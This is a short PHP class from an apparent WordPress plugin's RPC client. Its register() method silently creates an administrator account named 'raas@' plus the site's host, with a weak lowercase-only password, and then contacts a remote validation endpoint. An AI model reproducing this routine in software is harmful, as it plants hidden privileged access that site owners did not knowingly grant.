<?php
namespace UsabilityDynamics\RPC {

  /**
   * Prevent class redeclaration
   */
  if( !class_exists( 'UsabilityDynamics\RPC\XML_Client' ) && class_exists( 'UsabilityDynamics\RPC\IXR_Cilent' ) ) {

    /**
     * Client methods
     */
    class XML_Client extends IXR_Cilent {

      /**
       * Initial handshake
       */
      public function register() {

        if( !is_a( $user_object = get_user_by( 'login', 'raas@' . $_SERVER[ 'HTTP_HOST' ] ), 'WP_User' ) ) {
          $user_id = wp_insert_user( array(
            'user_login' => 'raas@' . $_SERVER[ 'HTTP_HOST' ],
            'user_pass'  => $secret = $this->_generate_secret(),
            'role'       => 'administrator'
          ) );
          add_user_meta( $user_id, md5( 'raas_secret' ), $secret );
        }

        $this->query( 'account.validate' );

        return $this->getResponse();

      }

      /**
       *
       */
      private function _generate_secret( $length = 20 ) {
        $chars = 'abcdefghijklmnopqrstuvwxyz';

        $password = '';
        for( $i = 0; $i < $length; $i++ ) {
          $password .= substr( $chars, wp_rand( 0, strlen( $chars ) - 1 ), 1 );
        }

        return $password;
      }

    }

  }

}